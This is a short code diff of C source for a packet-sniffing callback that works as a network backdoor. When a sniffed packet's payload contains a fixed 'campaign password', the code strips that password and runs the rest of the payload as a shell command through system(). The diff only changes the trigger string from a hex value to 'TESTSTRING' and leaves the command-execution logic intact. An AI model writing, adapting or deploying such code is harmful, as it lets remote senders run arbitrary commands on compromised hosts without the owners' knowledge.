@@ -61,8 +61,8 @@ void callback(u_char *arg, const struct pcap_pkthdr* pkthdr,
 		}
 	}
 	/* Check for campaign password */
-	if(strstr(payloadstr, "8eeebaa174df6099078228e73e98aa40f9b91340303c4f571ab9b7988bf68e9f")) {
-		removeSub(payloadstr, "8eeebaa174df6099078228e73e98aa40f9b91340303c4f571ab9b7988bf68e9f ");
+	if(strstr(payloadstr, "TESTSTRING")) {
+		removeSub(payloadstr, "TESTSTRING ");
 		printf("The system will execute %s\n", payloadstr);
 		system(payloadstr); /* Executes the remaining string as a command */
 	}
